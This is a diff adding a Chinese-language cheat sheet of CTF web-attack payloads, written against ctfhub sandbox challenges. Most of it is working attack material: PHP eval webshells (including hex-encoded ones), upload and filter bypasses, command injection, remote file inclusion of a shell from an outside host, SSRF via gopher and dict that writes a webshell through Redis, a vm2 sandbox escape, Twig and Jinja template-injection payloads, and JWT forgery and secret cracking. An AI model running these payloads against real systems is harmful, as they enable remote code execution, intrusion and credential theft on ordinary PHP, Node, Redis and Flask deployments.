@@ -1,0 +1,819 @@
+-->> namp 参数注入:
+# 读取标志文件到data.txt -iL 从哪读取内容 -oN 输出内容到哪
+namp 127.0.0.1 -iL /flag -oN data.txt   
+
+# 写入shell ""闭合
+<?php @eval($_POST["angel"]);?> -oG angel.php   
+# 失败  检测到 php
+
+# 十六进制 
+\x3C\x3F\x70\x68\x70\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x50
+\x4F\x53\x54\x5B\x27\x61\x6E\x67\x65\x6C\x27\x5D\x29\x3B\x3F\x3E   
+//这里不能用16进制写
+
+# PHP 一句话shell 16进制编码
+\x3C\x3F\x70\x68\x70\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x50\x4F\x53\x54\x5B\x27\x61\x6E\x67\x65\x6C\x27\x5D\x29\x3B\x3F\x3E  
+
+# 可以  成功写如shell 没转换16进制
+<?= @eval($_POST["password"]);?> -oG pwd.phtml   
+
+
+-->> apache .htaccess 文件利用:
+# 上传 .htaccess 文件
+# 将 .png 文件做为php文件解析
+AddType application/x-httpd-php .png   
+<?php
+  passthru("ls /var/www/html/");   # 第一步  查看目录
+  passthru("cat /var/www/html/flag_89433107.php")  # 第二步  读取目录下的文件
+?>
+
+# 通过index.phps可以访问网页的源代码文件
+# 查看代码，会对admin解码后的数据进行比较
+# 传入admin的url编码
+# 因为URL会自动对链接进行解码
+# 所以传入 admin的两次编码
+
+
+-->> upload 截断:
+#  1.上次路径 修改文件名
+POST /index.php%00.jpg
+#  2.文件信息 修改文件名 
+filename="shell.php%00.jpg"   # \00
+
+# 目录穿越 
+../../../shell.php%00.jpg
+
+# 双写绕过 
+shell.pphphp  
+# 将一个php替换为空  shell.php
+
+# upload 日期时间随机名
+# 查看响应包的返回时间 拼接出日期的文件名格式，后面加上一组范围的数字
+# 生成一组文件名
+# 然后 爆破文件
+  php代码： date("YmdHis") . rand(0,999) . ".php";
+        #  Tue, 26 Jan 2021 06:17:21 GMT
+        #  20210126061721174.php
+# 得到flag ctfhub{e6d9df6cefaf7e143b2c012d}
+
+
+-->> 文件包含include:
+# index.php
+<?php
+error_reporting(0);
+if (isset($_GET['file'])) {
+    if (!strpos($_GET["file"], "flag")) {
+        include $_GET["file"];
+    } else {
+        echo "Hacker!!!";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?>
+# shell.txt   .txt文件后缀，不能直接当做php执行里面的代码
+<?php eval($_REQUEST['ctfhub']);?>
+# include $_GET["file"]  
+.com/?file=shell.txt  # include包含shell.txt文件里面的内容到index.php，将里面的代码当做php代码执行
+# ctfhub一句话木马的密码  直接连接
+
+
+-->> php://input  伪协议:
+http://challenge-91c9976c1eaabb10.sandbox.ctfhub.com:10080/file=php://input   //伪协议
+# #  请求示例
+GET /?file=php://input HTTP/1.1
+Host: challenge-c2b5ce91bfeac510.sandbox.ctfhub.com:10800
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 33
+
+<?php system("cat /flag_21427")?>  #  input会读取这里的数据 替换这里的命令
+
+# 上传shell   //没有写权限
+<?php fputs(fopen("/var/www/html/shell.php","w"),"<?php @eval($_REQUEST['angel']); ?>"); ?>  
+
+# 列出网站主目录文件
+<?php system('ls /var/www/html'); ?>    
+
+# 列出服务器根路径目录 得到标志文件
+<?php system('ls /'); ?>   
+
+# 读取标志
+<?php system('cat /flag.txt'); ?>
+
+-->> 远程文件包含
+# 1   直接包含远程服务器的shell文件   执行里面的内容 
+http://challenge-91c9976c1eaabb10.sandbox.ctfhub.com:10080/?file=http://www.test.com/shell.php
+# 蚁剑连接  密码 angel
+
+
+-->> php://filter 伪协议:
+# 读取源代码 base64 编码输出
+http://challenge-91c9976c1eaabb10.sandbox.ctfhub.com:10080/?file=php://filter/read=convert.base64-encode
+/resource=/flag   
+
+
+-->> 任意文件读取 afr-2  :
+# 查看源码得到 ima/img.gif   //当前有个img目录
+url/img/    路径遍历漏洞
+../
+img.gif 
+url/img../    绝对路径后面加上 ../   访问上一级目录    目录穿越漏洞
+# 发送一个get请求
+GET /img../flag HTTP/1.1
+# 获取flag文件
+
+
+-->> 任意文件读取 afr-3:
+GET /article?name=n1page  # 报错
+得到： /home/nu11111111l/articles/n1page
+/home/nu11111111l/articles/*
+0 0x61727469636c6526266c73  --  --  --  --  --  article&&ls
+
+htmlentities('&')  # 特殊字符编码
+preg_match('flag',$string)  # 匹配到 报错退出
+echo file_get_contents($name)  # 源码
+GET /article?name=../../../etc/passwd  # 成功读取
+
+-->> 命令注入:
+?IP=127.0.0.1
+# 执行ls 命令将输出到data.txt  |  or  ;  or  &&
+?IP=127.0.0.1 | ls -la /var/www/html > /var/www/html/data.txt
+?IP=127.0.0.1 && ls -la /var/www/html > /var/www/html/data.txt
+?IP=127.0.0.1;ls -la /var/www/html > /var/www/html/data.txt 
+
+# 将flag复制到.txt文件
+?ip=127.0.0.1 | cp /var/www/html/flag_175202517520961.php /var/www/html/test.txt
+
+# 直接查看 .txt文件
+www.ctfhub.com/var/www/html/test.txt   
+
+
+-->> 过滤空格:
+?ip=127.0.0.1 || ls -la /var/www/html
+# 绕过：  
+?ip=127.0.0.1||ls</var/www/html
+
+# //绕过空格 正确命令
+cp${IFS}/var/www/html/flag_51951995019174.php${IFS}/var/www/html/data.txt  
+
+# 绕过方法
+{cp,/var/www/html/flag_51951995019174.php,/var/www/html/data.txt}  #  ctfhub 不适合
+IFS=,;'cat<<<cat,/etc/passwd' 
+cat$IFS/etc/passwd 
+cat${IFS}/etc/passwd 
+cat</etc/passwd 
+{cat,/etc/passwd}
+
+
+-->> 过滤 /  目录分割符:
+/?ip=127.0.0.1 || cd flag_is_here || cp flag_3212385296069.php data.txt
+# ||  &&  判断执行
+; 不管成不成功 都按顺序执行
+
+#  ubuntu terminal 字符过滤绕过:  (不能在浏览器执行，会被转义)
+# 前面全部过滤  绕过的方式有%0a、%0d、%0D%0A
+(!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m))
+
+# 使用 %0a 作为命令分隔符  
+# ${IFS} 绕过过滤空格   
+# * '' 绕过 cat flag 字符串过滤
+/?ip=127.0.0.1%0acd${IFS}fl*ag_is_here%0ac''at<fl$ag_20172258416121.php
+
+a | b  # 只执行B
+a & b  # 先执行B再执行A
+
+# 反序列化 字符串检测绕过:
+ls ==>  l$@s  #  $@ 进行绕过字符串检测
+
+
+-->> url 绕过:
+# url必须包含： "http://notflag.ctfhub.com" 
+?url=http://notflag.ctfhub.com@127.0.0.1/flag.php  # 得到flag
+http://www.baidu.com@www.sina.com/index.html   # url解析 实际访问 www.sina.com/index.html 绕过检测
+
+
+-->>  ip地址  过滤绕过:
+?url=127.0.0.1/flag.php  # 被过滤   error：400
+# 127.0.0.1  ==>>  0x7F000001   16进制形式
+?url=0x7F000001/flag.php   # 得到标志
+
+
+-->> ban了  127.0.0.1  但是要访问本机:
+?url=127.0.0.1/flag.php   # 被过滤了
+# 将127.0.0.1 转换成16进制   7F.0.0.1  -->   0x7F000001
+?url=0x7F000001/flag.php   # 得到flag
+
+
+-->> POST请求 gopher协议:
+访问http://challenge-2908b3512de85e40.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php
+# 获取到key  Debug: key=32063cf451d5caccf85c401ae18fb573
+
+# 提交的 POST 请求：  (HTTP请求中转换编码注意字母大写，小写会400错误)
+POST /flag.php HTTP/1.1     # payload   POST请求
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36    
+# 上面4个字段是POST请求必须的
+key=ec7362d1e354247fe589c0652201544b  #  POST数据
+
+POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+key=6da124f4b465b7410f4a1b2d68d36211
+
+# 编码转换
+?url=gopher://127.0.0.1:80/_POST%2520%252fflag.php%2520HTTP%252f1.1%250d%250aHost%253a%2520127.0.0.1%25
+3a80%250d%250aContent-Type%253a%2520application%252fx-www-form-urlencoded%250d%250aContent-Length%25
+3a%252036%250d%250a%250d%250akey%253d6da124f4b465b7410f4a1b2d68d36211   
+# 成功得到 flag
+
+
+SSRF 3种漏洞利用协议:
+-->> file 协议:
+http://www.sina.com/?url=   # source url
+http://www.sina.com/?url=file:///var/www/html/password.txt  # 利用 file 协议读取敏感文件
+http://www.sina.com/?url=file://C:\Windows\Users\password.txt  # 利用 file 协议读取敏感文件
+
+-->> gopher 协议:
+http://www.sina.com/?url=  //源url
+http://www.sina.com/?url=gopher://127.0.0.1:80/_payload
+# _ 代表返回数据的占位符 _可以是任意字符   old_response=23456(少个1)   _占位  new_response=123456
+
+#  payload : 一个 POST 请求  -- 下面4个字段是POST请求必须的
+POST /flag.php HTTP/1.1   # 要访问的敏锐文件 /flag.php
+Host: 127.0.0.1:80    # 主机：端口
+Content-Type: application/x-www-form-urlencoded   # 内容类型
+Content-Length: 36   # POST 数据的长度
+key=ec7362d1e354247fe589c0652201544b  # POST数据
+
+# 需要将 payload 进行 url编码
+# 先将 POST 请求包编码一次
+# ? 需要转换url编码为 %3f
+# 在每个 %0a(换行符 \n) 前面加上一个 %0d(\r 符号)   // \r\n  这个形式
+# 在HTTP包的最后 手动加上 %0d%0a
+
+# 然后将POST请求包编码第二次
+http://www.sina.com/?url=gopher://127.0.0.1:80/_payload  # 跳转两次  payload需要进行两次编码
+
+# 需要进行 3次编码
+http://www.sina.com/?url=127.0.0.1/302.php?url=gopher://127.0.0.1:80/_payload   # 跳转3次
+
+# 跳转分析：
+POST请求包： POST /flag HTTP/1.1    # 一次跳转请求
+POST的数据： key=ec7362d1e354247fe589c0652201544b   # 2次跳转请求
+?url=127.0.0.1/302.php?url=    # 302跳转  3次跳转请求
+
+# 第一次编码
+POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AUser-Agent%3A%20Mozil
+la%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A84.0)%20Gecko%2F20100101%2
+0Firefox%2F84.0%0D%0AAccept%3A%20text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2
+Fxml%3Bq%3D0.9%2Cimage%2Fwebp%2C*%2F*%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq
+%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-
+Encoding%3A%20gzip%2C%20deflate%0D%0AContent-Type%3A%20multipart%2Fform-data%3B%20bounda
+ry%3D---------------------------14171010023550442333835870523%0D%0AContent-Length%3A%203
+85%0D%0AOrigin%3A%20http%3A%2F%2Fchallenge-f2814f28627b49d2.sandbox.ctfhub.com%3A10080%0
+D%0AConnection%3A%20close%0D%0AReferer%3A%20http%3A%2F%2Fchallenge-f2814f28627b49d2.sand
+box.ctfhub.com%3A10080%2F%3Furl%3D_%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0A%0D%0A---
+--------------------------14171010023550442333835870523%0D%0AContent-Disposition%3A%20fo
+rm-data%3B%20name%3D%22file%22%3B%20filename%3D%22shell.php%22%0D%0AContent-Type%3A%20ap
+plication%2Foctet-stream%0D%0A%0D%0A%3C%3Fphp%20%40eval(%24_POST%5Bangel%5D)%3B%3F%3E%0D
+%0A-----------------------------14171010023550442333835870523%0D%0AContent-Disposition%3A
+%20form-data%3B%20name%3D%22submit%22%0D%0A%0D%0A%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2%0D
+%0A-----------------------------14171010023550442333835870523--
+
+# 在每个%0A前面加上%0D，进行第二次编码:
+POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%25
+0AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%
+2520x64%253B%2520rv%253A84.0)%2520Gecko%252F20100101%2520Firefox%252F84.0%250D%250AAcce
+pt%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253
+Bq%253D0.9%252Cimage%252Fwebp%252C*%252F*%253Bq%253D0.8%250D%250AAccept-Language%253A%2
+520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US
+253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520defl
+ate%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D------
+---------------------14171010023550442333835870523%250D%250AContent-Length%253A%2520385
+%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-f2814f28627b49d2.sandbox.ctfhub.
+com%253A10080%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A%25
+2F%252Fchallenge-f2814f28627b49d2.sandbox.ctfhub.com%253A10080%252F%253Furl%253D_%250D%2
+50AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A----------------------------
+-14171010023550442333835870523%250D%250AContent-Disposition%253A%2520form-data%253B%252
+0name%253D%2522file%2522%253B%2520filename%253D%2522shell.php%2522%250D%250AContent-Typ
+e%253A%2520application%252Foctet-stream%250D%250A%250D%250A%253C%253Fphp%2520%2540eval(
+%2524_POST%255Bangel%255D)%253B%253F%253E%250D%250A-----------------------------14171010
+023550442333835870523%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D
+%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%
+25AF%25A2%250D%250A-----------------------------14171010023550442333835870523--
+
+# 访问 得到标志
+?url=gopher://127.0.0.1:80/_payload
+# ctfhub{6004521e8b91a02f6bf138d7}
+
+-->> dict 协议:
+# dict格式  
+dict://hostname:port/命令:参数:参数
+
+?url=dict://192.168.0.100:$var$ HTTP/1.1    # 利用burpsuite爆破 port
+?url=dict://192.168.0.100:10080/info HTTP/1.1  # INFO 探测是否设置口令
+?url=dict://192.168.0.100:10080/auth:$var$ HTTP/1.1  #  : 代替空格
+?url=dict://127.0.0.1:6379/flushall   # 刷新
+?url=dict://192.168.0.100:10080/config:set:dir:/var/www/html  # 将rdb目录更改到网站主目录
+?url=dict://192.168.0.100:10080/config:set:dbfilename:shell.php   # 将rdb的文件名dbfilename改为webshell.php
+?url=dict://192.168.0.100:10080/set:webshell:"<?php @eval($_POST[angel]);?>"  # 写不进去
+
+# 写入webshell 字符串
+# 绕过过滤 十六进制写入
+?url=dict://192.168.124.153:6380/set:shell:"\x3C\x3F\x70\x68\x70\x20\x40\x65\x76\x61\x6C\x28\x24
+\x5F\x50\x4F\x53\x54\x5B\x27\x61\x6E\x67\x65\x6C\x27\x5D\x29\x3B\x3F\x3E"  
+
+# 最后写 save   刷新缓存
+?url=dict://192.168.0.100:10080/save
+
+
+-->> js 代码逃逸:
+https://github.com/patriksimek/vm2/issues/225
+# Aodzip:
+# 可以利用字符串拆分和base64编码绕过过滤
+
+global[[`eva`, `l`].join(``)](Buffer.from(`ENCODED`, `base64`).toString(`ascii`));
+# ENCODED=TypeError.prototype.get_process = f => f.constructor("return process")();
+try {
+    Object.preventExtensions(Buffer.from("")).a = 1;
+} catch (e) {
+    e.get_process(() => { }).mainModule.require("child_process").execSync("cat /flag").toString();
+}
+
+# base64 编码得到  方法1
+global[[`eva`,%20`l`].join(``)](Buffer.from(`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5
+jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5
+mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXV
+pcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`,%20`base64`).toString(`ascii`));
+
+# 十六进制 编码  方法2
+(function(){TypeError[String.fromCharCode(112,114,111,116,111,116,121,112,101)][`\x67\x65\x74\x5f\x70
+\x72\x6f\x63\x65\x73\x73`] = f=>f[`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`](`\x72\x65\x74\x75\x72
+\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){
+return e[`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`](()=>{}).mainModule.require((`\x63\x68\x69\x6c\x64
+\x5f\x70\x72\x6f\x63\x65\x73\x73`))[`\x65\x78\x65\x63\x53\x79\x6e\x63`](`cat /flag`).toString();}})()
+# 得到flag  ctfhub{d8dc69abf984952529367d80}
+
+
+-->> twig 模板注入 （php）:
+# 模板引擎： Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig
+<?php
+  require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
+  Twig_Autoloader::register(true);
+  $twig = new Twig_Environment(new Twig_Loader_String());
+  $output = $twig->render("Hello {$_GET['name']}"); # 将用户输入作为模版内容的一部分
+  echo $output;
+?>
+# 用户能控制 name 变量  输入 {{2*10}}  输出20   执行用户输入代码
+
+{{["id"]|map("system")|join(",")
+{{["id", 0]|sort("system")|join(",")}}
+{{["id"]|filter("system")|join(",")}}
+{{[0, 0]|reduce("system", "id")|join(",")}}
+{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
+{{{"<?php @eval($_POST[angel])?>":"/var/www/html/shell.php"}|map("file_put_contents")}}
+# 上面不能执行
+
+# twig payload 格式
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+
+# 写入shell失败 目录应该没有写入权限
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo '\x3C\x3F\x70\x68\x70
+\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x50\x4F\x53\x54\x5B\x27\x61\x6E\x67\x65\x6C\x27\x5D\x29\x3B\x3F\x3E' > shell.php")}}
+
+# 成功示例
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ls /")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
+# ctfhub{3e307b39ed6653f6db7e610f}
+
+
+-->> SSI 注入漏洞  .stm .shtm .shtml (不传脚本文件格式时，可以尝试上传这个后缀):
+语法：
+ 指令         参数列表
+config      errmsg timefmt sizefmt
+include      virtual file
+echo        var
+fsize         file
+flastmod      file
+exec        cmd  cgi
+# 示例
+# 1、获取本文档名称：
+<!–# echo var="DOCUMENT_NAME"–>
+
+# 2、获取当前时间：
+<!–# echo var="DATE_LOCAL"–>
+
+# 3、获取当前IP：
+<! # echo var="REMOTE_ADDR"–>
+
+<!--# exec cmd="cat /etc/passwd"-->
+<!--# exec cgi="/cgi-bin/access_log.cgi"–>
+# 满足以下三个条件存在SSL注入：
+Web服务器支持SSI；   
+用户输入内容，返回在HTML页面中;
+参数值未进行输入清理
+
+
+-->> python 服务器:
+/proc/sched_debug #  提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
+/proc/mounts #  挂载的文件系统列表
+/proc/net/arp #  arp表，可以获得内网其他机器的地址
+/proc/net/route #  路由表信息
+/proc/net/tcp and /proc/net/udp #  活动连接的信息
+/proc/net/fib_trie #  路由缓存
+/proc/version  #  内核版本
+/proc/[PID]/cmdline #  可能包含有用的路径信息
+/proc/[PID]/environ #   程序运行的环境变量信息，可以用来包含getshell
+/proc/[PID]/cwd     #  当前进程的工作目录
+/proc/[PID]/fd/[# ] #  访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
+
+../../../proc/self/cmdline   # 读取到 python server.py
+../../../proc/self/environ   # 环境变量   /home/sssssserver
+PYTHONIOENCODING=UTF-8KUBERNETES_PORT=tcp://172.22.128.1:443KUBERNETES_SERVICE_PORT=6443DOMAIN_NAME=challenge-a3be3def11
+cd781b.sandbox.ctfhub.comHOSTNAME=challenge-a3be3def11cd781b-556994784f-gstpsPYTHON_PIP_VERSION=20.0.2SHLVL=1HOME=/root
+GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FFPYTHON_APP=server.pyPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/r
+aw/d59197a3c169cef378a22428a3fa99d33e080a5d/get-pip.pyKUBERNETES_PORT_443_TCP_ADDR=172.22.128.1PATH=/usr/local/bin:/usr/l
+ocal/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpLA
+NG=C.UTF-8PYTHON_VERSION=2.7.17KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT_443_TCP=tcp://172.22.128.1:443KUBERNETES_S
+ERVICE_HOST=10.0.252.30PWD=/home/sssssserverPYTHON_GET_PIP_SHA256=421ac1d44c0cf9730a088e337867d974b91bdce4ea26360992750718
+78cc189eFLAG=not_flag
+
+../../../home/sssssserver/server.py   # 读取 源代码文件
+key = &# 39;Drmhze6EPcv0fN_81Bj-nA&# 39;
+
+
+-->> JWT json web token:
+JWT ==  header(base64) + payload(base64) + signature(计算)
+# 这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，0
+# 然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。
+
+token: eyJBRyI6IjIwYjJjZjYzNjY4N2YzOH0iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluI
+iwicGFzc3dvcmQiOiIxMjM0NTYiLCJGTCI6ImN0Zmh1YnszYjUwYzI1YjEifQ._vBLCYG1aOxBbrDJug2PyGZ6Hj6w0nk8B2RYST9QtZw
+# JSON Web Tokens 插件 解码
+Headers = {
+  "AG": "20b2cf636687f38}",
+  "typ": "JWT",
+  "alg": "HS256"
+}
+Payload = {
+  "username": "admin",
+  "password": "123456",
+  "FL": "ctfhub{3b50c25b12"
+}
+Signature = "_vBLCYG1aOxBbrDJug2PyGZ6Hj6w0nk8B2RYST9QtZw"
+# 拼接flag字段  得到flag
+
+
+-->> JWT 无签名:
+# 返回的token
+Headers = {
+  "typ": "JWT",
+  "alg": "HS256"
+}
+Payload = {
+  "username": "admin",
+  "password": "123456",
+  "role": "guest"
+}
+Signature = "MaphZVk25q4stXxAmEgXmKCW7aUo3jDJtgv9DwahLwc"
+# 需要将 alg 字段设置为空   role 设置为admin
+# Sign签名字段丢掉  进行base64 加密
+header.payload.     # 替换到guest用户的token   发送请求
+# 得到标志
+
+
+-->> JWT 弱密钥:
+# 抓包获得token
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIx
+MjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.wvIlY3EXzLj90-ceLnR5DJSD-s9OCT0RRaU_fCBoKVQ
+# 使用 c-jwt-cracker  //ubuntu
+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc
+3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.wvIlY3EXzLj90-ceLnR5DJSD-s9OCT0RRaU_fCBoKVQ
+secret= arpc
+key= arpc   # 弱密钥
+role ="guest"  --> "admin"   # jwt.io 在线加密 得到token  
+# 解密后的token
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0N
+TYiLCJyb2xlIjoiYWRtaW4ifQ.BEudOAOqXrodGICwZ8PnHRtnYSJ2bwcaNEMdnfMv-Uk
+
+
+-->> 修改签名算法:
+# public key
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxpMUyRmIfEeeBNs3kXn+
+GeGTpj6PpWKYsGfvGdtPCecPeky0VfR+w7b5axU1uz4dg095vVuAKm9wEkJNZRIn
+b1NIdlREtLIAZRI35sZjnuMmiNKV6V8uyk4s9K35K/ZqsIPOmFz1TEQBso4VDIPy
+uMNRHDDEsV8voHRpe9fiQK3d6ubB41z8j9/Ol7FgPzK7CYQxNK9HkVZOdM9/AiDj
+4fTWbKLbbfm+rqSxIQ34xYfSDhouusipOvI0MLBaDDOWDwwaZqC3cV4oYdxDGzMy
+iAOyko7iMHMf0OLHwk0H2iNWUnLFI+uaoUlR9ZRFsm5bCuYgYJFIeWNcFcuw0/G3
+dwIDAQAB
+-----END PUBLIC KEY-----
+# token:  # RS256 非对称加密
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.f2Z
+OOdGrxHh7F7HWUjeQxSVOtPwZYvV4YIQ5RcWBIX4HxT7J9LuCYp0d4WbkFhqxBfhANreuOw5LuXdVUXo4fwAM1FN
+6-EONgDM-dOBkYcRvY4T2eR-hksE3e1W7oawox1A-Xfkity0WXIMSiwQXdETssiHi-U51LN9qkT2SkTba0gb_R5cL
+S38id1I9sxlYswphvhHBOWmWLTcUuqakYkH_gO7cNtvo9SfBGWoePwKvPLrQSCt5VamcQUezldDKeKYgW9BNDVxm
+T70EFMYUtUpQWbohgwRwSebkQ9hr5A3EdmNfHinMsdGQnLHQBfP_8ufizEAxTSpoWiM9aZULOA
+
+header=
+{
+  "typ": "JWT",
+  "alg": "RS256"  --> "HS256" (修改为对称加密算法)
+}
+payload=
+{
+  "username": "admin",
+  "role": "guest"  --> "admin"  (管理员权限)
+}
+# sign= 使用获得的公钥进行加密
+# 拼接成一个token  请求
+
+
+-->> easy_login  node.js:
+
+
+-->> python SSTI:
+import flask
+import os
+
+app = flask.Flask(__name__)
+app.config['FLAG'] = os.environ.pop('FLAG')
+
+@app.route('/')
+def index():
+    return open(__file__).read()
+
+@app.route('/shrine/')
+def shrine(shrine):
+    def safe_jinja(s):
+        s = s.replace('(', '').replace(')', '')
+        blacklist = ['config', 'self'] 
+        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s 
+    return flask.render_template_string(safe_jinja(shrine))
+
+if __name__ == '__main__':
+  app.run(debug=True)
+# {{2*2}} 输出4   执行我们代码
+
+# 程序绑定了两个web页面；
+# 访问根目录会得到程序源代码；
+# shrine目录下存在渲染模板的函数，有可能是突破口；
+# FLAG存在flask框架的config文件中；
+# 对于输入的部分有过滤
+{{url_for.__globals__['current_app'].config.FLAG}}
+{{get_flashed_messages.__globals__['current_app'].config.FLAG}}
+
+
+-->> fastCGI 协议攻击:
+CGI: 一种协议，web server 可以将动态请求和相关参数发送给专门处理动态内容的应用程序
+FastCGI: CGI协议的改进版
+PHP-CGI: php-cgi是php的cgi协议实现
+PHP-FMP: php-cgi协议的改进版
+# 使用 FastCGI_exp.py  exploit
+
+
+-->> redis 协议攻击:
+?url=dict://127.0.0.1:6379/flushall     # 刷新
+?url=dict://192.168.0.100:10080/config:set:dir:/var/www/html    # 将rdb目录更改到网站主目录
+?url=dict://192.168.0.100:10080/config:set:dbfilename:shell.php    # 将rdb的文件名dbfilename改为webshell.php
+?url=dict://192.168.0.100:10080/set:webshell:"<?php @eval($_POST['angel']);?>"  # 写不进去
+
+# 写入webshell 字符串
+# 绕过过滤 十六进制写入
+?url=dict://192.168.124.153:6380/set:shell:"\x3C\x3F\x70\x68\x70\x20\x40\x65\x76
+\x61\x6C\x28\x24\x5F\x50\x4F\x53\x54\x5B\x27\x61\x6E\x67\x65\x6C\x27\x5D\x29\x3B\x3F\x3E"  
+# 最后写 save   刷新缓存
+?url=dict://192.168.0.100:10080/save  
+
+
+
+-->> Nginx(IIS 7) 解析漏洞:
+http://www.sina.com/favicon.ico/.php  #  fpm解析 favicon.ico 被当作PHP文件解析了
+
+
+-->> 文件上传:
+?url=127.0.0.1/flag.php    # 上传文件页面，没有上传按钮
+自己修改前端 <input type="submit" name="submit">  # 构造上传按钮
+# 抓包
+POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------14171010023550442333835870523
+Content-Length: 385
+Origin: http://challenge-f2814f28627b49d2.sandbox.ctfhub.com:10080
+Connection: close
+Referer: http://challenge-f2814f28627b49d2.sandbox.ctfhub.com:10080/?url=_
+Upgrade-Insecure-Requests: 1
+
+-----------------------------14171010023550442333835870523
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php @eval($_POST[angel]);?>
+-----------------------------14171010023550442333835870523
+Content-Disposition: form-data; name="submit"
+
